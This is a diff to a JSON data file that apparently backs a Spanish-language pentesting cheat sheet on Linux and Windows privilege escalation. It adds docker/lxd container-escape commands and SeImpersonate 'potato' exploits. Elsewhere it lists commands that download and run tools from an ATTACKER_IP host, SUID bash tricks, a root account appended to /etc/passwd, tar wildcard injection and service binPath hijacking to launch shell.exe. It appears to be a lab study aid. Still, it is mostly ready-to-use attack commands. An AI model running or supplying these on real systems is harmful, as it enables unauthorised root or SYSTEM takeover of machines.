         "systemctl list-timers 2>/dev/null",
         "curl -sL http://ATTACKER_IP:8000/linpeas.sh | sh",
         "wget http://ATTACKER_IP:8000/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh",
@@ -1616,7 +1684,13 @@
         "showmount -e $IP",
         "sudo mount -o rw $IP:/share /mnt && cp $(which bash) /mnt/bash && chmod +s /mnt/bash",
         "uname -a; cat /etc/os-release",
-        "searchsploit linux kernel <version>"
+        "searchsploit linux kernel <version>",
+        "id",
+        "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
+        "lxc image import ./alpine.tar.gz --alias privesc",
+        "lxc init privesc r00t -c security.privileged=true",
+        "lxc config device add r00t host disk source=/ path=/mnt/root recursive=true",
+        "lxc start r00t && lxc exec r00t /bin/sh"
       ],
       "tables": [
         [
@@ -1657,11 +1731,8 @@
           "code",
           [
             "whoami; id; groups; hostname; pwd",
-            "sudo -l",
             "find / -perm -4000 -type f -ls 2>/dev/null",
-            "getcap -r / 2>/dev/null",
             "find / -writable -type d 2>/dev/null | grep -vE '^/proc|^/sys|^/dev'",
-            "cat /etc/crontab; ls -la /etc/cron.*",
             "systemctl list-timers 2>/dev/null"
           ]
         ],
@@ -1763,6 +1834,21 @@
           ]
         ],
         [
+          "h2",
+          "Contenedores (docker / lxd)"
+        ],
+        [
+          "code",
+          [
+            "id",
+            "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
+            "lxc image import ./alpine.tar.gz --alias privesc",
+            "lxc init privesc r00t -c security.privileged=true",
+            "lxc config device add r00t host disk source=/ path=/mnt/root recursive=true",
+            "lxc start r00t && lxc exec r00t /bin/sh"
+          ]
+        ],
+        [
           "table",
           [
             [
@@ -1800,7 +1886,7 @@
           ]
         ]
       ],
-      "searchText": "Linux privesc De shell normal a root por permisos, tareas, configs o credenciales. La regla: si puedes modificar algo que otro usuario mas privilegiado ejecuta o lee, tienes un vector potencial. whoami; id; groups; hostname; pwd sudo -l find / -perm -4000 -type f -ls 2>/dev/null getcap -r / 2>/dev/null find / -writable -type d 2>/dev/null | grep -vE '^/proc|^/sys|^/dev' cat /etc/crontab; ls -la /etc/cron.* systemctl list-timers 2>/dev/null Automatizado curl -sL http://ATTACKER_IP:8000/linpeas.sh | sh wget http://ATTACKER_IP:8000/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh ./pspy64 sudo / GTFOBins sudo -l sudo find . -exec /bin/sh \\; -quit sudo vim -c ':!/bin/sh' sudo env /bin/sh sudo LD_PRELOAD=/tmp/x.so <binario> SUID / SGID find / -perm -4000 -type f 2>/dev/null /usr/bin/find . -exec /bin/sh -p \\; -quit cp $(which bash) /tmp/rootbash && chmod +s /tmp/rootbash && /tmp/rootbash -p Capabilities getcap -r / 2>/dev/null /usr/bin/python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")' /usr/bin/perl -e 'use POSIX qw(setuid); setuid(0); exec \"/bin/sh\";' Cron / tareas cat /etc/crontab; ls -la /etc/cron.* echo 'chmod +s /bin/bash' >> script_escribible.sh touch -- '--checkpoint=1'; touch -- '--checkpoint-action=exec=sh privesc.sh' Ficheros escribibles ls -la /etc/passwd /etc/shadow openssl passwd -1 -salt hax pass123 echo 'r00t:<hash>:0:0::/root:/bin/bash' >> /etc/passwd && su r00t NFS no_root_squash cat /etc/exports showmount -e $IP sudo mount -o rw $IP:/share /mnt && cp $(which bash) /mnt/bash && chmod +s /mnt/bash Kernel / version uname -a; cat /etc/os-release searchsploit linux kernel <version> Vector Que mirar sudo NOPASSWD, binarios GTFOBins, scripts como otro usuario, rutas relativas. SUID/SGID bash, find, vim, less, cp, tar, zip, python, perl, nmap, env. Capabilities cap_setuid, cap_dac_read_search, cap_dac_override, cap_sys_admin. Cron/timers Scripts escribibles, PATH inseguro, comodines, backups ejecutados como root. Credenciales Configs, backups, /var/www, .ssh, history, DB dumps. Contenedores docker/lxd/lxc groups, docker.sock, montajes privilegiados."
+      "searchText": "Linux privesc De shell normal a root por permisos, tareas, configs o credenciales. La regla: si puedes modificar algo que otro usuario mas privilegiado ejecuta o lee, tienes un vector potencial. whoami; id; groups; hostname; pwd find / -perm -4000 -type f -ls 2>/dev/null find / -writable -type d 2>/dev/null | grep -vE '^/proc|^/sys|^/dev' systemctl list-timers 2>/dev/null Automatizado curl -sL http://ATTACKER_IP:8000/linpeas.sh | sh wget http://ATTACKER_IP:8000/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh ./pspy64 sudo / GTFOBins sudo -l sudo find . -exec /bin/sh \\; -quit sudo vim -c ':!/bin/sh' sudo env /bin/sh sudo LD_PRELOAD=/tmp/x.so <binario> SUID / SGID find / -perm -4000 -type f 2>/dev/null /usr/bin/find . -exec /bin/sh -p \\; -quit cp $(which bash) /tmp/rootbash && chmod +s /tmp/rootbash && /tmp/rootbash -p Capabilities getcap -r / 2>/dev/null /usr/bin/python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")' /usr/bin/perl -e 'use POSIX qw(setuid); setuid(0); exec \"/bin/sh\";' Cron / tareas cat /etc/crontab; ls -la /etc/cron.* echo 'chmod +s /bin/bash' >> script_escribible.sh touch -- '--checkpoint=1'; touch -- '--checkpoint-action=exec=sh privesc.sh' Ficheros escribibles ls -la /etc/passwd /etc/shadow openssl passwd -1 -salt hax pass123 echo 'r00t:<hash>:0:0::/root:/bin/bash' >> /etc/passwd && su r00t NFS no_root_squash cat /etc/exports showmount -e $IP sudo mount -o rw $IP:/share /mnt && cp $(which bash) /mnt/bash && chmod +s /mnt/bash Kernel / version uname -a; cat /etc/os-release searchsploit linux kernel <version> Contenedores (docker / lxd) id docker run -v /:/mnt --rm -it alpine chroot /mnt sh lxc image import ./alpine.tar.gz --alias privesc lxc init privesc r00t -c security.privileged=true lxc config device add r00t host disk source=/ path=/mnt/root recursive=true lxc start r00t && lxc exec r00t /bin/sh Vector Que mirar sudo NOPASSWD, binarios GTFOBins, scripts como otro usuario, rutas relativas. SUID/SGID bash, find, vim, less, cp, tar, zip, python, perl, nmap, env. Capabilities cap_setuid, cap_dac_read_search, cap_dac_override, cap_sys_admin. Cron/timers Scripts escribibles, PATH inseguro, comodines, backups ejecutados como root. Credenciales Configs, backups, /var/www, .ssh, history, DB dumps. Contenedores docker/lxd/lxc groups, docker.sock, montajes privilegiados."
     },
     {
       "id": "section-12",
@@ -1856,7 +1942,11 @@
         "findstr /si password *.txt *.ini *.config *.xml 2>nul",
         "type C:\\Windows\\Panther\\Unattend.xml 2>nul",
         "type C:\\Windows\\Panther\\Unattended.xml 2>nul",
-        "type %USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt 2>nul"
+        "type %USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt 2>nul",
+        "certutil -urlcache -split -f http://ATTACKER_IP:8000/PrintSpoofer64.exe C:\\Windows\\Temp\\ps.exe",
+        "C:\\Windows\\Temp\\ps.exe -i -c \"C:\\Windows\\Temp\\shell.exe\"",
+        "C:\\Windows\\Temp\\GodPotato.exe -cmd \"cmd /c whoami\"",
+        "JuicyPotato.exe -l 1337 -p C:\\Windows\\Temp\\shell.exe -t *"
       ],
       "tables": [
         [
@@ -2010,6 +2100,19 @@
           ]
         ],
         [
+          "h2",
+          "Token / SeImpersonate (potato)"
+        ],
+        [
+          "code",
+          [
+            "certutil -urlcache -split -f http://ATTACKER_IP:8000/PrintSpoofer64.exe C:\\Windows\\Temp\\ps.exe",
+            "C:\\Windows\\Temp\\ps.exe -i -c \"C:\\Windows\\Temp\\shell.exe\"",
+            "C:\\Windows\\Temp\\GodPotato.exe -cmd \"cmd /c whoami\"",
+            "JuicyPotato.exe -l 1337 -p C:\\Windows\\Temp\\shell.exe -t *"
+          ]
+        ],
+        [
           "table",
           [
             [
@@ -2051,7 +2154,7 @@
           ]
         ]
       ],
-      "searchText": "Windows privesc Post-exploit Windows fuera de AD. Enumeracion inicial whoami whoami /groups whoami /priv whoami /user hostname echo %USERNAME% echo %USERDOMAIN% ver systeminfo wmic os get Caption,Version,BuildNumber,OSArchitecture wmic qfe get Caption,Description,HotFixID,InstalledOn wmic product get name,version 2>nul Automatizado (winPEAS) powershell -NoProfile -ExecutionPolicy Bypass certutil -urlcache -split -f http://ATTACKER_IP:8000/winPEASx64.exe C:\\Windows\\Temp\\winpeas.exe powershell -c \"iwr http://ATTACKER_IP:8000/winPEASx64.exe -OutFile C:\\Windows\\Temp\\winpeas.exe\" C:\\Windows\\Temp\\winpeas.exe Servicios debiles sc query state= all wmic service get name,displayname,pathname,startmode wmic service get name,displayname,pathname,startmode | findstr /i \"Auto\" sc qc SERVICIO accesschk.exe -uwcqv \"Authenticated Users\" * accesschk.exe -uwcqv %USERNAME% SERVICIO sc config SERVICIO binPath= \"cmd /c C:\\Windows\\Temp\\shell.exe\" sc stop SERVICIO sc start SERVICIO Unquoted service path wmic service get name,pathname,startmode | findstr /i /v \"C:\\Windows\" | findstr /i /v '\"' dir \"C:\\Program Files\" dir \"C:\\Program Files (x86)\" icacls \"C:\\Program Files\" icacls \"C:\\Program Files\\Vendor App\" Tareas programadas schtasks /query /fo LIST /v dir C:\\Windows\\Tasks dir C:\\Windows\\System32\\Tasks /s /b Registro / autoruns reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run AlwaysInstallElevated reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated msiexec /quiet /qn /i C:\\Windows\\Temp\\payload.msi Credenciales cmdkey /list dir /s /b *pass* *cred* *config* *backup* 2>nul findstr /si password *.txt *.ini *.config *.xml 2>nul type C:\\Windows\\Panther\\Unattend.xml 2>nul type C:\\Windows\\Panther\\Unattended.xml 2>nul type %USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt 2>nul Vector Senal Servicios debiles Puedes cambiar binPath, reiniciar servicio o sustituir ejecutable. Unquoted service path Ruta con espacios sin comillas y directorio intermedio escribible. AlwaysInstallElevated HKCU y HKLM Installer AlwaysInstallElevated a 1. Tareas programadas Script/binario ejecutado por usuario superior en ruta escribible. SeImpersonatePrivilege Potato/PrintSpoofer/RoguePotato segun version y restricciones del lab. SeBackupPrivilege Lectura de archivos protegidos, SAM/SYSTEM o datos sensibles. Credenciales IIS configs, web.config, PowerShell history, Unattend.xml, cmdkey."
+      "searchText": "Windows privesc Post-exploit Windows fuera de AD. Enumeracion inicial whoami whoami /groups whoami /priv whoami /user hostname echo %USERNAME% echo %USERDOMAIN% ver systeminfo wmic os get Caption,Version,BuildNumber,OSArchitecture wmic qfe get Caption,Description,HotFixID,InstalledOn wmic product get name,version 2>nul Automatizado (winPEAS) powershell -NoProfile -ExecutionPolicy Bypass certutil -urlcache -split -f http://ATTACKER_IP:8000/winPEASx64.exe C:\\Windows\\Temp\\winpeas.exe powershell -c \"iwr http://ATTACKER_IP:8000/winPEASx64.exe -OutFile C:\\Windows\\Temp\\winpeas.exe\" C:\\Windows\\Temp\\winpeas.exe Servicios debiles sc query state= all wmic service get name,displayname,pathname,startmode wmic service get name,displayname,pathname,startmode | findstr /i \"Auto\" sc qc SERVICIO accesschk.exe -uwcqv \"Authenticated Users\" * accesschk.exe -uwcqv %USERNAME% SERVICIO sc config SERVICIO binPath= \"cmd /c C:\\Windows\\Temp\\shell.exe\" sc stop SERVICIO sc start SERVICIO Unquoted service path wmic service get name,pathname,startmode | findstr /i /v \"C:\\Windows\" | findstr /i /v '\"' dir \"C:\\Program Files\" dir \"C:\\Program Files (x86)\" icacls \"C:\\Program Files\" icacls \"C:\\Program Files\\Vendor App\" Tareas programadas schtasks /query /fo LIST /v dir C:\\Windows\\Tasks dir C:\\Windows\\System32\\Tasks /s /b Registro / autoruns reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run AlwaysInstallElevated reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated msiexec /quiet /qn /i C:\\Windows\\Temp\\payload.msi Credenciales cmdkey /list dir /s /b *pass* *cred* *config* *backup* 2>nul findstr /si password *.txt *.ini *.config *.xml 2>nul type C:\\Windows\\Panther\\Unattend.xml 2>nul type C:\\Windows\\Panther\\Unattended.xml 2>nul type %USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt 2>nul Token / SeImpersonate (potato) certutil -urlcache -split -f http://ATTACKER_IP:8000/PrintSpoofer64.exe C:\\Windows\\Temp\\ps.exe C:\\Windows\\Temp\\ps.exe -i -c \"C:\\Windows\\Temp\\shell.exe\" C:\\Windows\\Temp\\GodPotato.exe -cmd \"cmd /c whoami\" JuicyPotato.exe -l 1337 -p C:\\Windows\\Temp\\shell.exe -t * Vector Senal Servicios debiles Puedes cambiar binPath, reiniciar servicio o sustituir ejecutable. Unquoted service path Ruta con espacios sin comillas y directorio intermedio escribible. AlwaysInstallElevated HKCU y HKLM Installer AlwaysInstallElevated a 1. Tareas programadas Script/binario ejecutado por usuario superior en ruta escribible. SeImpersonatePrivilege Potato/PrintSpoofer/RoguePotato segun version y restricciones del lab. SeBackupPrivilege Lectura de archivos protegidos, SAM/SYSTEM o datos sensibles. Credenciales IIS configs, web.config, PowerShell history, Unattend.xml, cmdkey."
     },
     {
       "id": "section-13",
